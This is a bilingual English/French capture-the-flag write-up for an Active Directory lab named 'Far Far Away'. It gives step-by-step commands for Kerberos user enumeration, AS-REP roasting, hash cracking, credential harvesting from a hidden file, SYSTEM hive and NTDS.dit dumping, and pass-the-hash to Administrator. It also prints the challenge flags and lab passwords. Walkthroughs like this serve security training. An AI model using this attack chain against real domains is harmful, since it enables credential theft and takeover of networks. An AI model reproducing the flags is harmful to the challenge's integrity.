# CTF Challenge Writeup: Far Far Away

## English Writeup

### Challenge Overview
"Far Far Away" is an Active Directory exploitation challenge that tests your knowledge of Windows domain enumeration and privilege escalation techniques. You'll need to leverage various Kerberos attacks, credential harvesting, and Windows privilege abuse to reach the final flag.

### Step 1: Initial Reconnaissance
Begin by performing network reconnaissance to identify the domain controller at IP 51.79.55.195. Using tools like nmap, you can identify that this is a Windows domain controller for FARFARAWAY.local with services like Kerberos (88/tcp) and WinRM (5985/tcp) running.

```
$ nmap -sC -sV 51.79.55.195
```

### Step 2: Kerberos User Enumeration
Using tools like Kerbrute or similar, enumerate valid usernames in the domain:

```
$ kerbrute userenum --dc 51.79.55.195 -d FARFARAWAY.local /path/to/wordlist.txt
```

This should reveal several users including dragon.

### Step 3: ASREPRoasting dragon
After identifying dragon, we can check if Kerberos pre-authentication is disabled for this account using GetNPUsers.py from Impacket:

```
$ python3 GetNPUsers.py FARFARAWAY.local/dragon -no-pass -dc-ip 51.79.55.195
```

This reveals that dragon has pre-authentication disabled, which allows us to obtain a TGT hash without knowing the password.

### Step 4: Cracking dragon's Password
Using the captured hash, we can crack dragon's password with Hashcat:

```
$ hashcat -m 18200 john_hash.txt /path/to/wordlist.txt
```

This reveals the password: dragon123

### Step 5: WinRM Access as dragon
With dragon's credentials, we can access the system via WinRM:

```
$ evil-winrm -i 51.79.55.195 -u dragon -p dragon123
```

Once connected, we can explore dragon's desktop and find the first flag:
```
*Evil-WinRM* PS C:\Users\dragon\Desktop> type flag1.txt
FLAG{Th1s_1s_My_Sw4mp_N0w!}
```

### Step 6: Finding Hidden Credentials
Looking for hidden files on dragon's desktop:

```
*Evil-WinRM* PS C:\Users\dragon\Desktop> dir -Force
```

This reveals a hidden file named .swamp_secrets.txt. Reading this file:

```
*Evil-WinRM* PS C:\Users\dragon\Desktop> type .swamp_secrets.txt
Found credentials for shrek.shrek: MHX996qm7f8FG92w
```
We find out that shrek has backup operator rights.

### Step 7: Finding NTDS.dit File
Exploring dragon's desktop further, we find an NTDS.dit file:

```
*Evil-WinRM* PS C:\Users\dragon\Desktop> dir
```

We can download this file to our local machine:

```
*Evil-WinRM* PS C:\Users\dragon\Desktop> download ntds.dit
```

### Step 8: Extracting SYSTEM Hive
To extract hashes from the NTDS.dit file, we also need the SYSTEM hive:

```
*Evil-WinRM* PS C:\> .\runascs.exe shrek.shrek MHX996qm7f8FG92w "reg save HKLM\SYSTEM C:\Windows\Temp\system.save"
*Evil-WinRM* PS C:\> .\runascs.exe shrek.shrek MHX996qm7f8FG92w "icacls C:\Windows\Temp\system.save /grant Users:(F)"
*Evil-WinRM* PS C:\> download C:\Windows\Temp\system.save
```

### Step 9: Extracting Hashes from NTDS.dit
On our local machine, we can use secretsdump.py to extract hashes from the NTDS.dit file:

```
$ secretsdump.py -ntds ntds.dit -system system.save LOCAL
```

This reveals the NTLM hash for the Administrator account:


### Step 10: Using the Administrator Hash for Pass-the-Hash
Now we can use the Administrator hash to access the system with a pass-the-hash attack:

```
evil-winrm -i 51.79.55.195 -u Administrator -H <HASH_NTLM>
```

### Step 11: Retrieving the Final Flag
Once connected as Administrator, we can retrieve the final flag:

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag2.txt
FLAG{B3tt3r_0ut_Th4n_1n!}
```

---

## French Writeup

### Aperçu du défi
"Far Far Away" est un défi d'exploitation Active Directory qui teste vos connaissances en matière d'énumération de domaine Windows et de techniques d'élévation de privilèges. Vous devrez utiliser diverses attaques Kerberos, récolter des identifiants et abuser des privilèges Windows pour atteindre le drapeau final.

### Étape 1 : Reconnaissance initiale
Commencez par effectuer une reconnaissance réseau pour identifier le contrôleur de domaine à l'adresse IP 51.79.55.195. À l'aide d'outils comme nmap, vous pouvez identifier qu'il s'agit d'un contrôleur de domaine Windows pour FARFARAWAY.local avec des services comme Kerberos (88/tcp) et WinRM (5985/tcp) en cours d'exécution.

```
$ nmap -sC -sV 51.79.55.195
```

### Étape 2 : Énumération des utilisateurs Kerberos
À l'aide d'outils comme Kerbrute ou similaires, énumérez les noms d'utilisateur valides dans le domaine :

```
$ kerbrute userenum --dc 51.79.55.195 -d FARFARAWAY.local /chemin/vers/wordlist.txt
```

Cela devrait révéler plusieurs utilisateurs, notamment dragon.

### Étape 3 : ASREPRoasting de dragon
Après avoir identifié dragon, nous pouvons vérifier si la pré-authentification Kerberos est désactivée pour ce compte en utilisant GetNPUsers.py d'Impacket :

```
$ python3 GetNPUsers.py FARFARAWAY.local/dragon -no-pass -dc-ip 51.79.55.195
```

Cela révèle que dragon a la pré-authentification désactivée, ce qui nous permet d'obtenir un hash TGT sans connaître le mot de passe.

### Étape 4 : Craquage du mot de passe de dragon
En utilisant le hash capturé, nous pouvons cracker le mot de passe de dragon avec Hashcat :

```
$ hashcat -m 18200 john_hash.txt /chemin/vers/wordlist.txt
```

Cela révèle le mot de passe : dragon123

### Étape 5 : Accès WinRM en tant que dragon
Avec les identifiants de dragon, nous pouvons accéder au système via WinRM :

```
$ evil-winrm -i 51.79.55.195 -u dragon -p dragon123
```

Une fois connecté, nous pouvons explorer le bureau de dragon et trouver le premier drapeau :
```
*Evil-WinRM* PS C:\Users\dragon\Desktop> type flag1.txt
FLAG{Th1s_1s_My_Sw4mp_N0w!}
```

### Étape 6 : Découverte d'identifiants cachés
Recherche de fichiers cachés sur le bureau de dragon :

```
*Evil-WinRM* PS C:\Users\dragon\Desktop> dir -Force
```

Cela révèle un fichier caché nommé .swamp_secrets.txt. En lisant ce fichier :

```
*Evil-WinRM* PS C:\Users\dragon\Desktop> type .swamp_secrets.txt
Found credentials for shrek.shrek: MHX996qm7f8FG92w
```

On peut voir que Shrek a les droits backup operator.

### Étape 7 : Découverte du fichier NTDS.dit
En explorant davantage le bureau de dragon, nous trouvons un fichier NTDS.dit :

```
*Evil-WinRM* PS C:\Users\dragon\Desktop> dir
```

Nous pouvons télécharger ce fichier sur notre machine locale :

```
*Evil-WinRM* PS C:\Users\dragon\Desktop> download ntds.dit
```

### Étape 8 : Extraction de la ruche SYSTEM
Pour extraire les hashes du fichier NTDS.dit, nous avons également besoin de la ruche SYSTEM :

```
*Evil-WinRM* PS C:\> .\runascs.exe shrek.shrek MHX996qm7f8FG92w "reg save HKLM\SYSTEM C:\Windows\Temp\system.save"
*Evil-WinRM* PS C:\> .\runascs.exe shrek.shrek MHX996qm7f8FG92w "icacls C:\Windows\Temp\system.save /grant Users:(F)"
*Evil-WinRM* PS C:\> download C:\Windows\Temp\system.save
```

### Étape 9 : Extraction des hashes depuis NTDS.dit
Sur notre machine locale, nous pouvons utiliser secretsdump.py pour extraire les hashes du fichier NTDS.dit :

```
$ secretsdump.py -ntds ntds.dit -system system.save LOCAL
```

### Étape 10 : Utilisation du hash Administrateur pour Pass-the-Hash
Maintenant, nous pouvons utiliser le hash Administrateur pour accéder au système avec une attaque pass-the-hash :

```
evil-winrm -i 51.79.55.195 -u Administrator -H <hash>
```

### Étape 11 : Récupération du flag final
Une fois connecté en tant qu'Administrateur, nous pouvons récupérer le flag final :

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag2.txt
FLAG{B3tt3r_0ut_Th4n_1n!}
```

Défi terminé !